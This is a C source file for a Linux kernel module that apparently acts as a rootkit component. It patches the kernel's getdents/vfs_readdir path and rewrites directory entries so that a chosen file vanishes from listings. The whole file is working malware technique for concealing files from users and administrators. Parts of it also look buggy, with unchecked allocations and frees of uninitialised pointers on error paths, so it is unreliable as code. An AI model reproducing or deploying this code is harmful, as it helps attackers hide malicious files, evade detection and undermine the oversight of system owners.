#include "HideFile.h"

/*compare two string
 *<0 if s1<s2;
 *=0 if s1==s2;
 *>0 if s1>s2;
 * */
static int strCmp(char *s1, char *s2)
{
	int ndx1, ndx2;
	for(ndx1=0, ndx2=0; ;ndx1++,ndx2++){
		if(s1[ndx1] == '\0' && s2[ndx2] == '\0')
			return 0;
		if(s1[ndx1] == '\0' || s2[ndx2] == '\0')	
			return s1[ndx1] - s2[ndx2];
		if(s1[ndx1] < s2[ndx2]) 
			return s1[ndx1] - s2[ndx2];
		if(s1[ndx1] > s2[ndx2])
			return s1[ndx1] - s2[ndx2];
		continue;
	}
}
/*when the fileToHide is first one in the buf, swap that with the next to it*/
static int swap_kern_dirent(struct linux_dirent *dirent, struct linux_dirent *dirent_next)
{
	unsigned char *tmp;
	int len;
	int len_next;
	int pos;
	int i;
	if(dirent == NULL || dirent_next == NULL)
		return -1;
	len = dirent->d_reclen;
	tmp = kmalloc(len, GFP_KERNEL);
	for(i=0; i<len; i++){
		tmp[i] = ((unsigned char *)dirent)[i];
	}
	len_next = dirent_next->d_reclen;
	for(pos=0; pos<len_next; pos++){
		((unsigned char *)dirent)[pos] = ((unsigned char *)dirent_next)[pos]; 	
	}
	for(i=0; i<len; i++,pos++){
		((unsigned char *)dirent)[pos] = tmp[i];
	}
	return 0;
	
}
static int swap_user_dirent(struct linux_dirent __user *dirent, struct linux_dirent __user *dirent_next)
{
	int error = 0;
	unsigned char *kern_buf;
	unsigned char *kern_buf_next;
	int len;
	int len_next;

	if(dirent == NULL || dirent_next == NULL){
		error = -1;	
		goto out;
	}

	get_user(len, &dirent->d_reclen);
	kern_buf = (unsigned char *)kmalloc(len, GFP_KERNEL);
	if(copy_from_user(kern_buf, (unsigned char *)dirent, len) != 0){
		error = -1;
		goto out;
	}
	get_user(len_next, &dirent_next->d_reclen);
	kern_buf_next = (unsigned char *)kmalloc(len_next, GFP_KERNEL);
	if(copy_from_user(kern_buf_next, (unsigned char *)dirent_next, len_next) != 0){
		error = -1;
		goto out;
	}
	
	if(copy_to_user((unsigned char *)dirent, kern_buf_next, len_next) != 0){
		error = -1;
		goto out;
	}
	if(copy_to_user((unsigned char *)dirent_next, kern_buf, len) != 0){
		error = -1;
		goto out;
	}

out:
	if(kern_buf)
		kfree(kern_buf);
	if(kern_buf_next)
		kfree(kern_buf_next);
	return error;
}

static int hide_file(struct file *file, filldir_t filler, void *buf)
{
	int mem_size;
	int res;
	int bpos;
	int nread;
	char *filename;
	unsigned short *pre = NULL;
	unsigned char *kernel_buf;
	unsigned char *new_buf_start;
	struct linux_dirent *d;
	struct linux_dirent *d_next;
	struct linux_dirent __user *d_user;
	struct linux_dirent __user *d_user_next;
	struct linux_dirent __user *user_buf_start;//preserve user buffer
	struct linux_dirent __user *user_buf_pre;//vfs_readdir go through user buffer to make change to previous and current
	struct getdents_callback *dirent_calbak;

	/*initialize*/
	nread = 0;
	dirent_calbak	= (struct getdents_callback *)buf;
	mem_size		= dirent_calbak->count;
	user_buf_start	= dirent_calbak->current_dir;		

	/*vfs_readdir go through user buffer and make change to dirent_calbak->current and previous*/
	res = vfs_readdir(file, filler, (void *)dirent_calbak);	
	printk(KERN_INFO "hide_file:vfs_readdir:%d\n", res);	

	/*figure out nread to pass to kmalloc 
	 *according to getdents manual and getdents source code
	 * */
	user_buf_pre = dirent_calbak->previous;
	if(res >= 0)
		nread = dirent_calbak->error;
	if(user_buf_pre) {
		if(put_user(file->f_pos, &user_buf_pre->d_off))	{
			res = -1;
			goto out;
		}
		else 
			nread = mem_size - dirent_calbak->count;
	}
		

	printk(KERN_INFO "hide_file:nread:%d\n", nread);	
	if(nread < 0)
		goto out;
	//to the end of directory
	if(nread == 0)
		goto out;
				
	/*allocate kernel momery*/
	kernel_buf = (unsigned char *)kmalloc(nread, GFP_KERNEL);
	/*copy from user, user_buf_start is the start of user space buffer*/
	if(copy_from_user(kernel_buf, user_buf_start, nread) >= nread) {
		printk(KERN_INFO "copy_from_user failed!\n");	
		goto out;
	}
										
	/*hide file*/
	for(bpos = 0; bpos < nread ;){  
		d = (struct linux_dirent *) (kernel_buf + bpos);
		filename = (char *)d->d_name;
		if(strCmp(filename, fileToHide) == 0){
			printk(KERN_INFO "file found %s\n", filename);
			if(pre != NULL)	{
				//put to user space
				d_user = (struct linux_dirent __user *)((unsigned char *)user_buf_start + bpos - *pre);
				put_user(*pre + d->d_reclen, &d_user->d_reclen);
		}
			else {
				//first dirent how to be hide ??
				d_next = (struct linux_dirent *)(kernel_buf + bpos + d->d_reclen);
				swap_kern_dirent(d, d_next);

				d_user = user_buf_start;
				d_user_next = (struct linux_dirent __user *)((unsigned char *)d_user + d_user->d_reclen);
				swap_user_dirent(d_user, d_user_next);
				//put_user((unsigned char *)user_buf_start + d->d_reclen,&user_buf_start);
				/*
				new_buf_start = (unsigned char *)kmalloc(sizeof(unsigned char *), GFP_KERNEL);
				new_buf_start = (unsigned char *)user_buf_start + d->d_reclen;
				if(copy_to_user(&user_buf_start, new_buf_start, sizeof(unsigned char *)) > 0){
					res = -1;
					kfree(new_buf_start);
					goto out;
				}
				kfree(new_buf_start);
				*/
			}

		}
		printk(KERN_INFO "file name:%s\n", (char *)d->d_name);
		pre = &d->d_reclen;
		bpos += d->d_reclen;
	}
	kfree(kernel_buf);
out:
	return res;
}

static int __init hideFile_init(void)
{
	printk(KERN_INFO "init\n"); 
	printk(KERN_INFO "fileToHide:%s\n" , fileToHide);

	patch_kernel_func(addr_sys_getdents, addr_vfs_readdir, 
					(unsigned long long )hide_file);

	return 0;
}

static void __exit hideFile_exit(void)
{
	/*recover vfs_readdir*/
	patch_kernel_func(addr_sys_getdents, (unsigned long long )hide_file, 
										 addr_vfs_readdir);	
	printk(KERN_INFO "exit\n");
}

